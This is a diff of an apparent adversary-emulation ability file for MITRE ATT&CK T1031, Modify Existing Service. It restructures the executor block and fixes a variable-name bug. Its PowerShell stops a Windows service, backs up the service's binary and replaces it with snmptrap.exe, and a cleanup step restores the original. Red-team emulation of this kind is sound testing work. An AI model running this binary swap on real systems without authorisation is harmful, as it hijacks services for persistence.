@@ -10,22 +10,23 @@
   technique:
     attack_id: T1031
     name: Modify Existing Service
-  executors:
+  platforms:
     windows:
-      command: |
-        $svc = Get-Service -Name #{host.service.modifiable};
-        if ($s.status -ne 'Stopped') { Stop-Service $s };
-        $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
-        $path = (Resolve-Path $exe).Path;
-        Copy-Item -Path $path -Destination ($path + ".saved");
-        Copy-Item -Path "C:\Windows\System32\snmptrap.exe" -Destination $path
-      cleanup: |
-        $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
-        $path = (Resolve-Path $exe).Path;
-        If (Test-Path ($path + ".saved")) {
-          Remove-Item $path;
-          Move-Item -Path ($path + ".saved") -Destination $path
-        }
+      psh:
+        command: |
+          $s = Get-Service -Name #{host.service.modifiable};
+          if ($s.status -ne 'Stopped') { Stop-Service $s };
+          $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
+          $path = (Resolve-Path $exe).Path;
+          Copy-Item -Path $path -Destination ($path + ".saved");
+          Copy-Item -Path "C:\Windows\System32\snmptrap.exe" -Destination $path
+        cleanup: |
+          $exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
+          $path = (Resolve-Path $exe).Path;
+          If (Test-Path ($path + ".saved")) {
+            Remove-Item $path;
+            Move-Item -Path ($path + ".saved") -Destination $path
+          }
 
 
 
